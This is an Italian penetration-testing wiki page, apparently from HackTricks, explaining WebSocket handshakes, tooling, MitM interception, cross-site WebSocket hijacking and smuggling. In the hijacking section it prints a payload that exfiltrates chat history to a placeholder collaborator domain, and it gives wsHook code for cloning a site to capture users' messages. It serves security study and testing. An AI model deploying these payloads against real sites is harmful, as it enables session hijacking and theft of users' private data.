# Attacchi WebSocket

{{#include ../banners/hacktricks-training.md}}

## Cosa sono i WebSocket

Le connessioni WebSocket vengono stabilite attraverso un iniziale **HTTP** handshake e sono progettate per essere **a lungo termine**, consentendo la messaggistica bidirezionale in qualsiasi momento senza la necessità di un sistema transazionale. Questo rende i WebSocket particolarmente vantaggiosi per le applicazioni che richiedono **bassa latenza o comunicazione avviata dal server**, come i flussi di dati finanziari in tempo reale.

### Stabilimento delle Connessioni WebSocket

Una spiegazione dettagliata su come stabilire connessioni WebSocket può essere accessibile [**qui**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). In sintesi, le connessioni WebSocket sono solitamente avviate tramite JavaScript lato client come mostrato di seguito:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
Il protocollo `wss` indica una connessione WebSocket protetta con **TLS**, mentre `ws` indica una connessione **non protetta**.

Durante l'instaurazione della connessione, viene eseguito un handshake tra il browser e il server tramite HTTP. Il processo di handshake prevede che il browser invii una richiesta e il server risponda, come illustrato nei seguenti esempi:

Il browser invia una richiesta di handshake:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Risposta di handshake del server:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
La connessione rimane aperta per lo scambio di messaggi in entrambe le direzioni una volta stabilita.

**Punti Chiave del WebSocket Handshake:**

- Gli header `Connection` e `Upgrade` segnalano l'inizio di un handshake WebSocket.
- L'header `Sec-WebSocket-Version` indica la versione del protocollo WebSocket desiderata, di solito `13`.
- Un valore casuale codificato in Base64 viene inviato nell'header `Sec-WebSocket-Key`, garantendo che ogni handshake sia unico, il che aiuta a prevenire problemi con i proxy di caching. Questo valore non è per l'autenticazione ma per confermare che la risposta non sia generata da un server o da una cache mal configurati.
- L'header `Sec-WebSocket-Accept` nella risposta del server è un hash del `Sec-WebSocket-Key`, verificando l'intenzione del server di aprire una connessione WebSocket.

Queste caratteristiche garantiscono che il processo di handshake sia sicuro e affidabile, aprendo la strada a una comunicazione in tempo reale efficiente.

### Console Linux

Puoi usare `websocat` per stabilire una connessione raw con un websocket.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
O per creare un server websocat:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket connections

Se scopri che i client sono connessi a un **HTTP websocket** dalla tua attuale rete locale, potresti provare un [ARP Spoofing Attack](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) per eseguire un attacco MitM tra il client e il server.\
Una volta che il client sta cercando di connettersi, puoi quindi utilizzare:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Enumerazione dei Websockets

Puoi usare il **tool** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **per scoprire, identificare e cercare vulnerabilità note** **nei websockets** automaticamente.

### Strumenti di Debug per Websocket

- **Burp Suite** supporta la comunicazione MitM dei websockets in modo molto simile a come lo fa per la comunicazione HTTP regolare.
- L'estensione **[**socketsleuth**](https://github.com/snyk/socketsleuth)** di Burp Suite ti permetterà di gestire meglio le comunicazioni Websocket in Burp ottenendo la **cronologia**, impostando **regole di intercettazione**, utilizzando regole di **corrispondenza e sostituzione**, usando **Intruder** e **AutoRepeater.**
- [**WSSiP**](https://github.com/nccgroup/wssip)**:** Abbreviazione di "**WebSocket/Socket.io Proxy**", questo strumento, scritto in Node.js, fornisce un'interfaccia utente per **catturare, intercettare, inviare messaggi personalizzati** e visualizzare tutte le comunicazioni WebSocket e Socket.IO tra il client e il server.
- [**wsrepl**](https://github.com/doyensec/wsrepl) è un **REPL websocket interattivo** progettato specificamente per il penetration testing. Fornisce un'interfaccia per osservare **i messaggi websocket in arrivo e inviarne di nuovi**, con un framework facile da usare per **automatizzare** questa comunicazione.&#x20;
- [**https://websocketking.com/**](https://websocketking.com/) è un **web per comunicare** con altri web utilizzando **websockets**.
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) tra altri tipi di comunicazioni/protocolli, fornisce un **web per comunicare** con altri web utilizzando **websockets.**

## Laboratorio Websocket

In [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) hai un codice per lanciare un web utilizzando websockets e in [**questo post**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) puoi trovare una spiegazione.

## Hijacking WebSocket Cross-site (CSWSH)

**L'hijacking WebSocket cross-site**, noto anche come **hijacking WebSocket cross-origin**, è identificato come un caso specifico di **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** che colpisce gli handshake WebSocket. Questa vulnerabilità si verifica quando gli handshake WebSocket si autenticano esclusivamente tramite **HTTP cookies** senza **token CSRF** o misure di sicurezza simili.

Gli attaccanti possono sfruttare questo ospitando una **pagina web malevola** che avvia una connessione WebSocket cross-site a un'applicazione vulnerabile. Di conseguenza, questa connessione viene trattata come parte della sessione della vittima con l'applicazione, sfruttando la mancanza di protezione CSRF nel meccanismo di gestione delle sessioni.

### Attacco Semplice

Nota che quando si **stabilisce** una connessione **websocket**, il **cookie** viene **inviato** al server. Il **server** potrebbe usarlo per **relazionare** ogni **singolo** **utente** con la sua **sessione websocket** basata sul cookie inviato.

Quindi, se per **esempio** il **server websocket** **invia indietro la cronologia della conversazione** di un utente se viene inviato un msg con "**READY"**, allora un **semplice XSS** stabilendo la connessione (il **cookie** sarà **inviato** **automaticamente** per autorizzare l'utente vittima) **inviando** "**READY**" sarà in grado di **recuperare** la cronologia della **conversazione**.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie con un sottodominio diverso

In questo post del blog [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) l'attaccante è riuscito a **eseguire Javascript arbitrario in un sottodominio** del dominio in cui avveniva la comunicazione tramite web socket. Poiché si trattava di un **sottodominio**, il **cookie** veniva **inviato**, e poiché il **Websocket non controllava correttamente l'Origin**, era possibile comunicare con esso e **rubare token da esso**.

### Rubare dati dall'utente

Copia l'applicazione web che desideri impersonare (i file .html ad esempio) e all'interno dello script in cui avviene la comunicazione tramite websocket aggiungi questo codice:
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
Ora scarica il file `wsHook.js` da [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) e **salvalo all'interno della cartella con i file web**.\
Esporre l'applicazione web e far connettere un utente ad essa ti permetterà di rubare i messaggi inviati e ricevuti tramite websocket:
```javascript
sudo python3 -m http.server 80
```
## Condizioni di gara

Le condizioni di gara nei WebSocket sono anche un problema, [controlla queste informazioni per saperne di più](race-condition.md#rc-in-websockets).

## Altre vulnerabilità

Poiché i Web Sockets sono un meccanismo per **inviare dati al lato server e al lato client**, a seconda di come il server e il client gestiscono le informazioni, **i Web Sockets possono essere utilizzati per sfruttare diverse altre vulnerabilità come XSS, SQLi o qualsiasi altra vulnerabilità web comune utilizzando l'input di un utente da un websocket.**

## **WebSocket Smuggling**

Questa vulnerabilità potrebbe consentirti di **bypassare le restrizioni dei proxy inversi** facendoli credere che una **comunicazione websocket sia stata stabilita** (anche se non è vero). Questo potrebbe consentire a un attaccante di **accedere a endpoint nascosti**. Per ulteriori informazioni, controlla la seguente pagina:

{{#ref}}
h2c-smuggling.md
{{#endref}}

## Riferimenti

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

{{#include ../banners/hacktricks-training.md}}
